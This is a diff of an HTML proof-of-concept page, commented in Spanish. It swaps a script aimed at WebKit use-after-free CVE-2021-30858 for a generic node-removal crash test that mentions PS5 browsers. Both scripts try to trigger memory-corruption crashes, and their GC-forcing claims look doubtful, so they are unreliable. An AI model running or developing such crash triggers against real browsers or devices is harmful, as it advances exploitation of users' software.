@@ -1,37 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>PoC - CVE-2021-30858</title>
-  <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
-  <script>
-    function triggerUAF() {
-      console.log("[*] Ejecutando PoC CVE-2021-30858...");
-
-      let iframe = document.createElement("iframe");
-      iframe.src = "http://example.com"; // carga insegura que será "upgradeada"
-      document.body.appendChild(iframe);
-
-      // Simula condiciones de race / liberación anticipada
-      setTimeout(() => {
-        document.body.removeChild(iframe);
-        console.log("[*] iframe eliminado");
-
-        // Forzar GC
-        for (let i = 0; i < 10000; i++) {
-          let tmp = document.createElement("div");
-          tmp.innerHTML = i;
-        }
-
-        console.log("[*] Finalizado, si WebKit es vulnerable, puede haber crash o freeze.");
-      }, 10);
-    }
-
-    window.onload = triggerUAF;
-  </script>
+  <title>WebKit PoC - Use After Free Test</title>
 </head>
 <body>
-  <h1>Test CVE-2021-30858</h1>
-  <p>Este test provocará un posible crash si el navegador es vulnerable al bug CSP Use-After-Free.</p>
+  <script>
+    function triggerBug() {
+      let div = document.createElement("div");
+      document.body.appendChild(div);
+
+      // Estilo que puede provocar operaciones de render conflictivas
+      div.style.display = "contents";
+
+      // Crear estructura interna peligrosa
+      let inner = document.createElement("span");
+      inner.textContent = "Test";
+      div.appendChild(inner);
+
+      // Forzar recalculo de layout/render
+      getComputedStyle(inner).color;
+
+      // Eliminar el nodo para intentar provocar destrucción desordenada
+      div.remove();
+
+      // Forzar GC (sólo en navegadores con heapSize visible, como PS5)
+      try {
+        if (window.gc) window.gc();
+      } catch (e) {}
+
+      // Verificación mínima
+      console.log("PoC ejecutado. Revisa si hay crash, assertion o comportamiento extraño.");
+    }
+
+    triggerBug();
+  </script>
 </body>
 </html>
